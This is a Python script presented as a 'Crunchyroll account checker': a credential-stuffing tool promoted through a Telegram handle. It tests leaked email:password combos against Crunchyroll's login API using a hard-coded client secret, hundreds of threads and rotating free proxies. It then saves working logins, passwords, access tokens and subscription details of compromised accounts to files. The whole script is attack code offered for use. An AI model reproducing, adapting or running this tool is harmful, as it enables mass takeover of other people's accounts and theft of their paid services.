#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════╗
║  ██████╗██████╗ ██╗   ██╗███╗   ██╗ ██████╗██╗  ██╗██╗   ██╗    ║
║ ██╔════╝██╔══██╗██║   ██║████╗  ██║██╔════╝██║  ██║╚██╗ ██╔╝    ║
║ ██║     ██████╔╝██║   ██║██╔██╗ ██║██║     ███████║ ╚████╔╝     ║
║ ██║     ██╔══██╗██║   ██║██║╚██╗██║██║     ██╔══██║  ╚██╔╝      ║
║ ╚██████╗██║  ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║   ██║       ║
║  ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝   ╚═╝       ║
║                   CRUNCHYROLL ACCOUNT CHECKER                    ║
║                                                                  ║
║  🧨 @pypkg  ~  https://t.me/Hotmail                              ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import sys
import threading
import time
import os
import json
import random
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===== SAFE COLORAMA IMPORT (FALLBACK IF BROKEN) =====
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLOR_AVAILABLE = True
except ImportError:
    COLOR_AVAILABLE = False
    # Dummy classes for when colorama is missing
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = BLACK = RESET = ''
    class Style:
        RESET_ALL = BRIGHT = ''
    init = lambda autoreset=None: None
except Exception:
    # Catch any other issues (like the circular import)
    COLOR_AVAILABLE = False
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = BLACK = RESET = ''
    class Style:
        RESET_ALL = BRIGHT = ''
    init = lambda autoreset=None: None

# ===== CONFIG =====
THREADS = 200
TIMEOUT = 15
USER_AGENT = "Crunchyroll/3.84.1 Android/9 okhttp/4.12.0"
PROXY_TYPE = "http"
PROXY_SOURCES = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"

# ===== COLORS =====
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

# ===== COUNTRY LIST (مختصر للعرض) =====
COUNTRIES = {
    "US": "United States 🇺🇸", "GB": "United Kingdom 🇬🇧", "CA": "Canada 🇨🇦",
    "AU": "Australia 🇦🇺", "DE": "Germany 🇩🇪", "FR": "France 🇫🇷",
    "JP": "Japan 🇯🇵", "BR": "Brazil 🇧🇷", "IN": "India 🇮🇳",
    "IT": "Italy 🇮🇹", "ES": "Spain 🇪🇸", "MX": "Mexico 🇲🇽",
    "NL": "Netherlands 🇳🇱", "SE": "Sweden 🇸🇪", "NO": "Norway 🇳🇴",
    "DK": "Denmark 🇩🇰", "FI": "Finland 🇫🇮", "PL": "Poland 🇵🇱",
    "TR": "Turkey 🇹🇷", "SA": "Saudi Arabia 🇸🇦", "AE": "UAE 🇦🇪",
    "EG": "Egypt 🇪🇬", "ZA": "South Africa 🇿🇦", "RU": "Russia 🇷🇺",
    "CN": "China 🇨🇳", "KR": "South Korea 🇰🇷", "ID": "Indonesia 🇮🇩",
    "MY": "Malaysia 🇲🇾", "SG": "Singapore 🇸🇬", "TH": "Thailand 🇹🇭",
    "VN": "Vietnam 🇻🇳", "PH": "Philippines 🇵🇭", "PK": "Pakistan 🇵🇰",
    "BD": "Bangladesh 🇧🇩", "NG": "Nigeria 🇳🇬", "KE": "Kenya 🇰🇪",
}

# ===== PLAN TRANSLATION =====
PLAN_TRANSLATION = {
    "[streams.4]": "MEGA FAN",
    "[streams.1]": "FAN",
    "[streams.6]": "ULTIMATE FAN"
}

# ===== CREATE DIRS =====
os.makedirs("hits", exist_ok=True)

# ===== FETCH PROXIES =====
def fetch_proxies():
    try:
        print(f"{Y}[!] Fetching fresh proxies...{RESET}")
        response = requests.get(PROXY_SOURCES, timeout=10)
        if response.status_code == 200:
            proxies = [p.strip() for p in response.text.splitlines() if p.strip()]
            with open("proxies.txt", "w") as f:
                f.write("\n".join(proxies))
            print(f"{G}[+] Fetched {len(proxies)} proxies.{RESET}")
            return proxies
        else:
            print(f"{R}[-] Failed to fetch proxies.{RESET}")
            return []
    except:
        print(f"{R}[-] Error fetching proxies.{RESET}")
        return []

def load_proxies():
    if not os.path.exists("proxies.txt") or os.path.getsize("proxies.txt") == 0:
        return fetch_proxies()
    with open("proxies.txt", "r") as f:
        return [p.strip() for p in f.readlines() if p.strip()]

def get_proxy(proxies):
    if not proxies:
        return None
    proxy = random.choice(proxies)
    return {PROXY_TYPE: f"{PROXY_TYPE}://{proxy}"}

# ===== CHECK ACCOUNT =====
def check_account(combo, proxies):
    email, password = combo.split(":", 1)
    device_id = "".join(random.choices("0123456789abcdef", k=16))

    token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
    token_data = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "offline_access",
        "client_id": "ajcylfwdtjjtq7qpgks3",
        "client_secret": "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_",
        "device_type": "MrStealer",
        "device_id": device_id,
        "device_name": "MrStealer"
    }
    token_headers = {
        "User-Agent": USER_AGENT,
        "Content-Type": "application/x-www-form-urlencoded",
    }

    proxy = get_proxy(proxies)
    try:
        res = requests.post(token_url, data=token_data, headers=token_headers, proxies=proxy, timeout=TIMEOUT)
        if "invalid_credentials" in res.text or "invalid_grant" in res.text:
            return {"status": "invalid", "combo": combo}
        elif "access_token" not in res.text:
            return {"status": "error", "combo": combo}
    except:
        return {"status": "error", "combo": combo}

    try:
        token_data = res.json()
        access_token = token_data["access_token"]
        account_id = token_data.get("account_id", "N/A")
    except:
        return {"status": "error", "combo": combo}

    # Account info
    account_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
    account_headers = {
        "Authorization": f"Bearer {access_token}",
        "User-Agent": USER_AGENT
    }

    try:
        res = requests.get(account_url, headers=account_headers, proxies=proxy, timeout=TIMEOUT)
        if res.status_code != 200:
            return {"status": "error", "combo": combo}
    except:
        return {"status": "error", "combo": combo}

    try:
        account_data = res.json()
        external_id = account_data.get("external_id", "N/A")
    except:
        return {"status": "error", "combo": combo}

    # Subscription
    sub_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"
    sub_headers = {
        "Authorization": f"Bearer {access_token}",
        "User-Agent": USER_AGENT
    }

    try:
        res = requests.get(sub_url, headers=sub_headers, proxies=proxy, timeout=TIMEOUT)
        if res.status_code != 200:
            return {"status": "error", "combo": combo}
    except:
        return {"status": "error", "combo": combo}

    # Parse subscription
    try:
        country_code = re.search(r'"subscription_country":"(.*?)"', res.text)
        country_code = country_code.group(1) if country_code else "N/A"
        country = COUNTRIES.get(country_code, country_code)

        benefits = re.findall(r'"benefit":"(.*?)"', res.text)
        streams = [b for b in benefits if b.startswith("concurrent_")]
        cr_store = "cr_store" in benefits
        cr_premium = "cr_premium" in benefits

        plan_parts = []
        if streams:
            stream_count = streams[0].split(".")[1]
            plan_parts.append(PLAN_TRANSLATION.get(f"[streams.{stream_count}]", streams[0]))
        if cr_store:
            plan_parts.append("CR STORE")
        if cr_premium:
            plan_parts.append("CR PREMIUM")

        plan = " | ".join(plan_parts) if plan_parts else "FREE"

        expiry_match = re.search(r'"next_renewal_date":"(.*?)T', res.text)
        if expiry_match:
            expiry = expiry_match.group(1)
            expiry_date = datetime.strptime(expiry, "%Y-%m-%d")
            days_left = (expiry_date - datetime.now()).days
        else:
            expiry = "N/A"
            days_left = "N/A"

        return {
            "status": "hit",
            "combo": combo,
            "email": email,
            "password": password,
            "access_token": access_token,
            "account_id": account_id,
            "external_id": external_id,
            "country": country,
            "plan": plan,
            "expiry": expiry,
            "days_left": days_left
        }
    except:
        return {"status": "error", "combo": combo}

def save_hit(result):
    hit_type = "premium" if result["plan"] != "FREE" else "free"
    with open(f"hits/{hit_type}.txt", "a", encoding="utf-8") as f:
        f.write(
            f"Combo: {result['combo']}\n"
            f"Email: {result['email']}\n"
            f"Password: {result['password']}\n"
            f"Access Token: {result['access_token']}\n"
            f"Account ID: {result['account_id']}\n"
            f"External ID: {result['external_id']}\n"
            f"Country: {result['country']}\n"
            f"Plan: {result['plan']}\n"
            f"Expiry: {result['expiry']}\n"
            f"Days Left: {result['days_left']}\n"
            f"{'='*50}\n"
        )

# ===== MAIN =====
def main():
    # Banner
    banner = f"""
{BOLD}{C}╔═══════════════════════════════════════════════════════════════════╗
║  ██████╗██████╗ ██╗   ██╗███╗   ██╗ ██████╗██╗  ██╗██╗   ██╗    ║
║ ██╔════╝██╔══██╗██║   ██║████╗  ██║██╔════╝██║  ██║╚██╗ ██╔╝    ║
║ ██║     ██████╔╝██║   ██║██╔██╗ ██║██║     ███████║ ╚████╔╝     ║
║ ██║     ██╔══██╗██║   ██║██║╚██╗██║██║     ██╔══██║  ╚██╔╝      ║
║ ╚██████╗██║  ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║   ██║       ║
║  ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝   ╚═╝       ║
║                   CRUNCHYROLL ACCOUNT CHECKER                    ║
║                                                                  ║
║  {Y}🧨 @pypkg  ~  https://t.me/Hotmail{C}                              ║
╚═══════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)

    # Load combos
    combo_file = input(f"{C}[?] Enter combo file path (default: combos.txt): {RESET}").strip()
    if not combo_file:
        combo_file = "combos.txt"

    if not os.path.exists(combo_file):
        print(f"{R}❌ File '{combo_file}' not found!{RESET}")
        return

    with open(combo_file, "r") as f:
        combos = [line.strip() for line in f if line.strip()]

    # Load proxies
    use_proxies = input(f"{C}[?] Use proxies? (y/n, default: y): {RESET}").strip().lower()
    proxies = []
    if use_proxies != 'n':
        proxies = load_proxies()
        if not proxies:
            print(f"{Y}⚠️ No proxies available. Running without proxies.{RESET}")
        else:
            print(f"{G}✅ Loaded {len(proxies)} proxies.{RESET}")

    # Threads
    try:
        threads = int(input(f"{C}[?] Number of threads (default: 200): {RESET}").strip() or "200")
        threads = max(1, min(threads, 500))
    except:
        threads = 200

    print(f"{G}✅ Loaded {len(combos)} combos, using {threads} threads.{RESET}")
    confirm = input(f"{C}[?] Start checking? (y/n): {RESET}").strip().lower()
    if confirm != 'y':
        print(f"{Y}Aborted.{RESET}")
        return

    print(f"\n{Y}[!] Starting checker...{RESET}\n")

    # ===== STATS =====
    stats = {
        "total": len(combos),
        "checked": 0,
        "hits": 0,
        "free": 0,
        "premium": 0,
        "invalid": 0,
        "banned": 0,
        "errors": 0,
        "start_time": time.time()
    }

    # ===== STATS DISPLAY =====
    def print_stats_line():
        elapsed = time.time() - stats["start_time"]
        cpm = (stats["checked"] / elapsed) * 60 if elapsed > 0 else 0
        line = (
            f"\r{C}┌─────────────────────────────────────────────────────────────────────────────┐{RESET}\n"
            f"{C}│{RESET} {BOLD}{W}📊 PROGRESS{RESET}: {stats['checked']}/{stats['total']} "
            f"| {G}⚡ CPM{RESET}: {int(cpm)} "
            f"| {Y}⏱️ TIME{RESET}: {int(elapsed)}s                                                                        {C}│{RESET}\n"
            f"{C}├─────────────────────────────────────────────────────────────────────────────┤{RESET}\n"
            f"{C}│{RESET} {G}✅ HITS{RESET}: {stats['hits']:<6} "
            f"| {G}🌟 PREMIUM{RESET}: {stats['premium']:<6} "
            f"| {C}🎁 FREE{RESET}: {stats['free']:<6}                                                              {C}│{RESET}\n"
            f"{C}│{RESET} {R}❌ INVALID{RESET}: {stats['invalid']:<6} "
            f"| {M}🚫 BANNED{RESET}: {stats['banned']:<6} "
            f"| {Y}⚠️ ERRORS{RESET}: {stats['errors']:<6}                                                              {C}│{RESET}\n"
            f"{C}└─────────────────────────────────────────────────────────────────────────────┘{RESET}"
        )
        sys.stdout.write(line)
        sys.stdout.flush()

    # ===== THREAD POOL =====
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_account, combo, proxies) for combo in combos]
        for future in as_completed(futures):
            result = future.result()
            stats["checked"] += 1

            if result["status"] == "hit":
                stats["hits"] += 1
                if result["plan"] == "FREE":
                    stats["free"] += 1
                    print(f"\n{C}[🎁 FREE] {result['email']}:{result['password']} | {result['country']} | {result['plan']} | Exp: {result['expiry']} | Days: {result['days_left']}{RESET}")
                else:
                    stats["premium"] += 1
                    print(f"\n{G}[🌟 PREMIUM] {result['email']}:{result['password']} | {result['country']} | {result['plan']} | Exp: {result['expiry']} | Days: {result['days_left']}{RESET}")
                save_hit(result)
            elif result["status"] == "invalid":
                stats["invalid"] += 1
                print(f"\n{R}[❌ INVALID] {result['combo']}{RESET}")
            elif result["status"] == "banned":
                stats["banned"] += 1
                print(f"\n{M}[🚫 BANNED] {result['combo']}{RESET}")
                with open("hits/banned.txt", "a") as f:
                    f.write(f"{result['combo']}\n")
            else:
                stats["errors"] += 1
                print(f"\n{Y}[⚠️ ERROR] {result['combo']}{RESET}")

            print_stats_line()

    # ===== FINAL SUMMARY =====
    elapsed = time.time() - stats["start_time"]
    hours = int(elapsed // 3600)
    minutes = int((elapsed % 3600) // 60)
    seconds = int(elapsed % 60)

    print(f"\n\n{BOLD}{C}{'='*70}{RESET}")
    print(f"{BOLD}{C}                     📊 FINAL SUMMARY 📊{RESET}")
    print(f"{BOLD}{C}{'='*70}{RESET}\n")

    print(f"  {W}📁 Total Combos:      {stats['total']}")
    print(f"  {W}✅ Checked:           {stats['checked']}")
    print(f"  {W}⏱️ Time Elapsed:      {hours:02d}:{minutes:02d}:{seconds:02d}")
    print()

    print(f"  {G}🌟 TOTAL HITS:        {stats['hits']}")
    print(f"     {G}├─ Premium:        {stats['premium']}")
    print(f"     {C}└─ Free:           {stats['free']}")
    print()

    print(f"  {R}❌ INVALID:          {stats['invalid']}")
    print(f"  {M}🚫 BANNED:           {stats['banned']}")
    print(f"  {Y}⚠️ ERRORS:           {stats['errors']}")
    print()

    print(f"{BOLD}{C}{'='*70}{RESET}")
    print(f"{G}💎 @pypkg  ~  https://t.me/Hotmail{RESET}")
    print(f"{C}📁 Results saved in: hits/{RESET}\n")

if __name__ == "__main__":
    # Import requests here to avoid slowing down startup if missing
    global requests
    try:
        import requests
    except ImportError:
        print("❌ 'requests' module is not installed. Run: pip install requests")
        sys.exit(1)

    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{RESET}")
    except Exception as e:
        print(f"\n{R}[!] Error: {e}{RESET}")